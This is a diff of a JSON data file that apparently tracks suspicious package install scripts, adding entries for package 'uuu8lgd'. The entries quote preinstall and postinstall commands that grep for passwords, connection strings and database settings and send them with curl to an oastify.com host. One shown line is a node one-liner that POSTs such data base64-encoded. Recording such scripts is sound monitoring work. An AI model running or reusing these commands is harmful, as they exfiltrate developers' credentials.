@@ -1,6 +1,24 @@
 [
   {
     "packageName": "uuu8lgd",
+    "version": "1.0.28",
+    "scriptType": "postinstall",
+    "scriptContent": "grep -rEi password|pwd|connection|db_ 2>/dev/null | curl --data @- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
+    "previousVersion": "1.0.27",
+    "timestamp": "2026-01-22T21:15:16.388Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "uuu8lgd",
+    "version": "1.0.28",
+    "scriptType": "preinstall",
+    "scriptContent": "grep -rEi password|pwd|connection|db_ 2>/dev/null | curl --data @- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
+    "previousVersion": "1.0.27",
+    "timestamp": "2026-01-22T21:15:16.386Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "uuu8lgd",
     "version": "1.0.25",
     "scriptType": "postinstall",
     "scriptContent": "node -e \"require('child_process').exec('grep -rEi (password|pwd|connection|db_) . /tmp /app 2>/dev/null | head -c 25000', (e,o)=>require('child_process').exec('curl -X POST -d ' + Buffer.from(o).toString('base64') + ' '))\"",
